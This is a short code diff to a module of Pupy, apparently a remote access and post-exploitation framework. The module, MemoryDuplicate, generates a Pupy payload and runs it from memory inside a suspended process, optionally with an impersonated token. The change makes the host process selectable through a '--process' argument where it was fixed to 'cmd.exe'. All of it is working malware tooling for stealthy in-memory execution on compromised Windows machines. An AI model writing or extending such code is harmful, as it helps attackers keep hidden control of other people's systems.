@@ -21,7 +21,7 @@ class MemoryDuplicate(PupyModule):
 		PupyModule.__init__(self,*args, **kwargs)
 	def init_argparse(self):
 		self.arg_parser = PupyArgumentParser(prog="duplicate", description=self.__doc__)
-		#self.arg_parser.add_argument('-p', '--process', default='cmd.exe', help='process to start suspended')
+		self.arg_parser.add_argument('-p', '--process', default='cmd.exe', help='process to start suspended')
 		self.arg_parser.add_argument('-m', '--impersonate', action='store_true', help='use the current impersonated token (to use with impersonate module)')
 
 	def run(self, args):
@@ -34,6 +34,6 @@ class MemoryDuplicate(PupyModule):
 		else:
 			raw_pe=pupygen.get_edit_pupyx86_exe(self.client.get_conf())
 		self.success("Executing the payload from memory ...")
-		exec_pe(self, "", raw_pe=raw_pe, interactive=False, fork=True, timeout=None, use_impersonation=args.impersonate, suspended_process="cmd.exe")
+		exec_pe(self, "", raw_pe=raw_pe, interactive=False, fork=True, timeout=None, use_impersonation=args.impersonate, suspended_process=args.process)
 		self.success("pupy payload executed from memory")
 
